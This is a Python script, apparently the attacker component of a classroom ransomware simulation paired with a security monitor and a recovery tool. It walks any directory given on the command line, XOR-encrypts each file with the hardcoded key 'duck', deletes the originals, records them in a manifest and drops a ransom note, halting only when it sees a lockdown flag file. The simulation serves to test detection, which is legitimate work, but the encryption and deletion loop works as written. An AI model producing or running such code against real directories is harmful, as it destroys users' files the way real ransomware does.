# attack_agent.py
import os
import sys
import time
import random
import json
from datetime import datetime

# --- Configuration ---
ENCRYPTED_EXTENSION = ".enc"
RANSOM_NOTE_FILENAME = "RECOVER_YOUR_FILES.txt"
MANIFEST_FILENAME = ".__ransom_manifest__.json"
LOCKDOWN_FLAG_FILE = "system_lockdown.flag"  # Lockdown flag to check for
ENCRYPTION_KEY = "duck"  # Hardcoded key for the simulation
EXCLUSION_LIST = [
    "security_monitor.py",
    "attack_agent.py",
    "recovery.py",
    "main_controller.py",
    MANIFEST_FILENAME,
    RANSOM_NOTE_FILENAME,
    LOCKDOWN_FLAG_FILE,
    "security_monitor.log",
    "recovery.log",
    "__pycache__"
]

# --- Core Encryption Logic ---

def xor_crypt_bytes(data_bytes, key_str):
    """XOR encrypts/decrypts data with the given key"""
    key_bytes = key_str.encode('utf-8')
    key_len = len(key_bytes)
    return bytes([data_byte ^ key_bytes[i % key_len] for i, data_byte in enumerate(data_bytes)])

def create_ransom_note(target_dir, attack_halted=False):
    """Creates a ransom note in the target directory"""
    
    if attack_halted:
        note_content = """!!!!! RANSOMWARE ATTACK PARTIALLY COMPLETED !!!!!

Your security system has DETECTED and HALTED the encryption process!
Some files may have been encrypted before the security response.

This is a simulation. In a real attack, a security system might have saved 
many of your files from encryption by detecting and stopping the attack.

Recovery instructions:
1. Use the recovery.py to restore your files
2. The encryption key used was: 'duck'
"""
    else:
        note_content = """!!!!! YOUR FILES HAVE BEEN ENCRYPTED !!!!!

All your important documents, photos, and data files have been encrypted with 
military-grade encryption.

This is a simulation. In a real attack, you would be seeing instructions on how 
to pay a ransom to recover your files. NEVER pay ransoms in real life as there 
is no guarantee you'll get your files back.

Recovery instructions:
1. Use the recovery.py to restore your files
2. The encryption key used was: 'duck'
"""

    note_path = os.path.join(target_dir, RANSOM_NOTE_FILENAME)
    try:
        with open(note_path, 'w') as f:
            f.write(note_content)
        print(f"[ATTACK] Ransom note created: {note_path}")
    except Exception as e:
        print(f"[ATTACK] Error creating ransom note: {e}")

def is_system_locked(target_dir):
    """Check if the system has been locked down by the security monitor"""
    lockdown_path = os.path.join(target_dir, LOCKDOWN_FLAG_FILE)
    if os.path.exists(lockdown_path):
        try:
            with open(lockdown_path, 'r') as f:
                lockdown_message = f.read().strip()
            print(f"\n[ATTACK] DETECTED SYSTEM LOCKDOWN!")
            print(f"[ATTACK] Lockdown details: {lockdown_message[:100]}...")
            return True
        except Exception:
            return os.path.exists(lockdown_path)  # If can't read it, at least check it exists
    return False

def get_manifest_path(target_dir):
    """Get the full path to the manifest file"""
    return os.path.join(target_dir, MANIFEST_FILENAME)

def load_manifest(manifest_path):
    """Load the encryption manifest from JSON file"""
    if not os.path.exists(manifest_path):
        return []
    try:
        with open(manifest_path, 'r') as f:
            data = json.load(f)
            if isinstance(data, list):
                return data
            return []  # Return empty list if not a list
    except (json.JSONDecodeError, IOError):
        return []

def save_manifest(manifest_path, data):
    """Save the encryption manifest to JSON file"""
    try:
        with open(manifest_path, 'w') as f:
            json.dump(data, f, indent=4)
        return True
    except IOError:
        return False

def add_to_manifest(manifest_data, original_path, encrypted_path):
    """Add a file record to the manifest"""
    # Check if original_path already exists
    for record in manifest_data:
        if record.get("original_path") == original_path:
            record["encrypted_path"] = encrypted_path
            return
    manifest_data.append({
        "original_path": original_path,
        "encrypted_path": encrypted_path
    })

def simulate_attacker_activity(message, min_time=0.2, max_time=1.0):
    """Simulate attacker activity with a delay and progress indicators"""
    delay = random.uniform(min_time, max_time)
    progress_chars = ['|', '/', '-', '\\']
    
    print(f"[ATTACK] {message}", end='', flush=True)
    for i in range(int(delay * 10)):
        print(f"\r[ATTACK] {message} {progress_chars[i % len(progress_chars)]}", end='', flush=True)
        time.sleep(0.1)
    print(f"\r[ATTACK] {message} Complete.")

def process_directory(target_dir):
    """Process a directory to encrypt files in a ransomware simulation"""
    print(f"\n[ATTACK] Targeting directory: {target_dir}")
    print(f"[ATTACK] Starting encryption process with key: '{ENCRYPTION_KEY}'")
    
    # Small delay for dramatic effect
    simulate_attacker_activity("Analyzing target system...", 1.0, 2.0)
    simulate_attacker_activity("Preparing encryption routines...", 0.5, 1.5)
    simulate_attacker_activity("Disabling security measures...", 1.0, 2.0)
    
    manifest_path = get_manifest_path(target_dir)
    manifest_data = load_manifest(manifest_path)
    encrypted_count = 0
    attack_halted = False
    
    # Convert exclusion list to absolute paths
    absolute_exclusion_list = [os.path.abspath(os.path.join(target_dir, item)) for item in EXCLUSION_LIST]
    absolute_exclusion_list.append(os.path.abspath(manifest_path))
    
    simulate_attacker_activity("Beginning file encryption sequence...", 0.5, 1.0)
    print("\n[ATTACK] File encryption in progress...")
    
    for root, dirs, files in os.walk(target_dir):
        if is_system_locked(target_dir):
            print("\n[ATTACK] CRITICAL FAILURE: System has been locked by security controls!")
            print("[ATTACK] Unable to continue encryption process!")
            attack_halted = True
            break
        
        # Skip excluded directories
        dirs[:] = [d for d in dirs if os.path.abspath(os.path.join(root, d)) not in absolute_exclusion_list 
                   and not d.startswith(".")]
        
        for filename in files:
            # Check for system lockdown on EVERY file (changed from every 2 files)
            if is_system_locked(target_dir):
                print("\n[ATTACK] CRITICAL FAILURE: System has been locked by security controls!")
                print("[ATTACK] Unable to continue encryption process!")
                attack_halted = True
                break
            
            original_filepath = os.path.abspath(os.path.join(root, filename))
            
            # Skip excluded files
            if original_filepath in absolute_exclusion_list or filename in EXCLUSION_LIST:
                continue
            
            # Skip already encrypted files
            if filename.endswith(ENCRYPTED_EXTENSION):
                continue
            
            # Skip files already in manifest
            in_manifest = False
            for record in manifest_data:
                if record.get("original_path") == original_filepath:
                    in_manifest = True
                    break
            if in_manifest:
                continue
            
            # Encrypt the file
            encrypted_filepath = original_filepath + ENCRYPTED_EXTENSION
            print(f"[ATTACK] Encrypting: {original_filepath}")
            
            try:
                # Random delay to simulate varied file processing times
                time.sleep(random.uniform(0.05, 0.1))
                
                with open(original_filepath, 'rb') as f_in:
                    content = f_in.read()
                
                encrypted_content = xor_crypt_bytes(content, ENCRYPTION_KEY)
                
                # Add additional lockdown check before writing the encrypted file
                if is_system_locked(target_dir):
                    print("\n[ATTACK] CRITICAL FAILURE: System has been locked during encryption!")
                    print("[ATTACK] Unable to continue encryption process!")
                    attack_halted = True
                    break
                
                with open(encrypted_filepath, 'wb') as f_out:
                    f_out.write(encrypted_content)
                
                os.remove(original_filepath)  # Remove original after encryption
                add_to_manifest(manifest_data, original_filepath, encrypted_filepath)
                encrypted_count += 1
                
                # Simulate the attacker displaying progress
                if encrypted_count % 5 == 0:
                    print(f"[ATTACK] Progress: {encrypted_count} files encrypted")
            
            except Exception as e:
                print(f"[ATTACK] Error encrypting file {original_filepath}: {e}")
        
        if attack_halted:
            break
    
    # Save the manifest with encrypted file data
    if save_manifest(manifest_path, manifest_data):
        print(f"[ATTACK] Encryption manifest saved: {manifest_path}")
    else:
        print(f"[ATTACK] Error saving encryption manifest!")
    
    # Create the ransom note
    if encrypted_count > 0:
        create_ransom_note(target_dir, attack_halted)
    
    if attack_halted:
        print(f"\n[ATTACK] PARTIAL ENCRYPTION COMPLETED: {encrypted_count} files encrypted before system lockdown")
        print("[ATTACK] Security controls have prevented complete encryption of files")
    else:
        simulate_attacker_activity("Finalizing encryption...", 0.5, 1.0)
        print(f"\n[ATTACK] ENCRYPTION COMPLETED SUCCESSFULLY: {encrypted_count} files encrypted")
        print("[ATTACK] No security controls detected or bypassed successfully")

    return encrypted_count, attack_halted

def main():
    """Main function to run the attack agent"""
    if len(sys.argv) < 2:
        print("Error: No target directory specified")
        print("Usage: python attack_agent.py [target_directory]")
        sys.exit(1)
    
    target_dir = sys.argv[1]
    if not os.path.isdir(target_dir):
        print(f"Error: '{target_dir}' is not a valid directory")
        sys.exit(1)
    
    # Check if the system is already locked
    if is_system_locked(target_dir):
        print(f"\n[ATTACK] TARGET SYSTEM IS LOCKED: Cannot proceed with attack!")
        print(f"[ATTACK] A security system appears to be active on the target.")
        sys.exit(1)
    
    print("\n===== INITIATING RANSOMWARE ATTACK SIMULATION =====")
    print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Target: {os.path.abspath(target_dir)}")
    print("====================================================\n")
    
    # Run the encryption process
    encrypted_count, attack_halted = process_directory(target_dir)
    
    print("\n===== ATTACK SIMULATION COMPLETE =====")
    print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Files Encrypted: {encrypted_count}")
    print(f"Attack Status: {'PARTIALLY COMPLETED (HALTED BY SECURITY)' if attack_halted else 'COMPLETED SUCCESSFULLY'}")
    print("=======================================\n")


if __name__ == "__main__":
    main() 